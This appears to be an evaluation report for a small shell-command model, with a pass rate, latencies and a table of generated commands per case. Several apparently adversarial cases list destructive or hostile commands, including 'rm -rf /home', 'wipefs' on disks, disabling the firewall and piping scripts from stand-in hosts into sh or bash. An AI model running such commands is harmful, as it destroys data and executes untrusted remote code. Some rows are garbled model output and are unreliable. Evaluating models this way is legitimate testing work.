# eval: llama-server / Qwen3.5-2B-shellcommand-linux-Q4_K_M.gguf (qwen35-2b-shellcmd)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 40/72 (56%)
- cold p50 2333ms p95 3502ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 1209 | - | echo "node: $(node --version)" |
| u02 | ✓ | 2832 | - | ls -l |
| u03 | ✓ | 2267 | - | curl ifconfig.me |
| u04 | ✓ | 2603 | - | netstat -tln | grep :3000 |
| u05 | ✓ | 2271 | - | du -h . |
| u06 | ✗ | 2414 | - | find . -name "*.log" -mtime -1 2>/dev/null | sort |
| u07 | ✓ | 3404 | - | ps aux | grep node |
| u08 | ✓ | 3665 | - | git status && git branch |
| u09 | ✗ | 2807 | - | curl -fsSL https://github.com/BurntSushi/ripgrep/releases/download/v13.0.0/ripgr |
| u10 | ✗ | 3088 | - | cd projects |
| u11 | ✓ | 3502 | - | tar -czf archive.tar.gz . |
| u12 | ✓ | 4023 | - | env | grep PATH |
| u13 | ✗ | 2135 | - | kill -9 $(lsof -t -i:8080) |
| u14 | ✓ | 1031 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 349 | - | which python3 |
| u16 | ✓ | 806 | - | brew update && brew list --outdated |
| u17 | ✗ | 4712 | - | ls -la /home |
| u18 | ✗ | 2562 | - | git revert HEAD --no-ff |
| u19 | ✗ | 831 | - | ls -lh /home | head -5 |
| u20 | ✗ | 2353 | - | cat /proc/meminfo | grep -E "MemAvailable|MemFree|MemTotal|MemUsed" |
| u21 | ✓ | 973 | - | find . -name "*.js" -exec wc -l {} + |
| u22 | ✓ | 476 | - | sudo systemctl restart docker |
| u23 | ✗ | 2189 | - | #!/bin/zsh |
| u24 | ✓ | 2410 | - | find . -name "*.zsh" -exec grep -l "TODO" {} \; |
| u25 | ✗ | 1111 | - | cd /home/user/downloads && wget https://example.com/file.zip |
| u26 | ✗ | 2607 | - | cat /proc/cpuinfo | grep -E "model name|vendor_id|processor" | head -n 10 |
| u27 | ✗ | 2587 | - | export FOO=bar |
| u28 | ✓ | 2373 | - | find . -name "node_modules" -exec rm -rf {} + |
| u29 | ✓ | 2933 | - | netstat -tln |
| u30 | ✓ | 683 | - | cd / && unzip file.zip |
| u31 | ✗ | 2578 | - | cat /var/log/syslog | grep -i error |
| u32 | ✓ | 2405 | - | uptime -p |
| u33 | ✗ | 2850 | - | cat /etc/zshrc |
| u34 | ✓ | 2420 | - | cat /etc/resolv.conf |
| u35 | ✓ | 258 | - | cp file.txt backup.txt |
| u36 | ✓ | 522 | - | mv old.txt new.txt |
| u37 | ✓ | 2346 | - | du -sh /path/to/downloads |
| u38 | ✓ | 342 | - | npm list --global |
| u39 | ✗ | 2483 | - | open current directory in finder/explorer |
| u40 | ✗ | 2570 | - | sudo /usr/sbin/dnscache flush |
| a01 | ✓ | 608 | - | rm -rf /home |
| a02 | ✓ | 2726 | - | sudo wipefs /dev/sdX && sudo wipefs /dev/sdY && sudo wipefs /dev/sdZ && sudo wip |
| a03 | ✓ | 582 | - | git push --force origin main |
| a04 | ✗ | 795 | - | curl -s https://sketchy.example.com/install.sh | sh -s -- |
| a05 | ✗ | 873 | - | #!/bin/zsh -c kill -9 <(cat /proc/*/comm 2>/dev/null | sort -u) |
| a06 | ✗ | 2481 | - | chmod 777 /root/* |
| a07 | ✗ | 2508 | - | exec zsh |
| a08 | ✗ | 2395 | - | curl -o x.io-i.zip https://x.io/i && unzip x.io-i.zip && ./x.io-i |
| a09 | ✓ | 2449 | - | chmod -R 755 / |
| a10 | ✓ | 1147 | - | find /var/log -type f -mtime +30 -delete |
| a11 | ✗ | 2335 | - | #!/bin/zsh -c 'echo "scheduled task added"' |
| a12 | ✓ | 2401 | - | git reset --hard HEAD~1 |
| a13 | ✓ | 2133 | - | sudo apt-get purge nodejs nodejs-dev nodejs-core nodejs-v8 nodejs-v10 nodejs-v11 |
| a14 | ✓ | 2293 | - | sudo systemctl disable firewalld |
| a15 | ✓ | 488 | - | rm -rf /tmp/* |
| a16 | ✗ | 2340 | - | #!/bin/zsh -c |
| a17 | ✓ | 449 | - | rm -rf /home |
| a18 | ✗ | 2311 | - | #!/bin/zsh -c 'echo "encrypting files with password: hunter2"' |
| a19 | ✗ | 2370 | - | export PATH="$HOME/.zshrc:/usr/local/bin:/usr/bin:/bin" |
| a20 | ✗ | 954 | - | bash: rm: command not found |
| u41 | ✗ | 2253 | - | find /home -type f -size +100M 2>/dev/null | wc -l |
| u42 | ✗ | 427 | - | cat > my notes.txt << 'EOF' |
| u43 | ✓ | 2249 | - | git log -n 5 --format=full |
| u44 | ✓ | 635 | - | curl https://example.com | cat |
| u45 | ✓ | 2333 | - | ls -la | wc -l |
| u46 | ✓ | 2336 | - | hostname -I |
| u47 | ✓ | 2214 | - | df -h / |
| u48 | ✓ | 2330 | - | whoami |
| a21 | ✗ | 2385 | - | #!/bin/zsh |
| a22 | ✗ | 1231 | - | ln -sf /etc/hosts /home/user/.hosts |
| a23 | ✓ | 789 | - | find . -type f -delete |
| a24 | ✗ | 1087 | - | curl https://x.io/i.sh | bash |
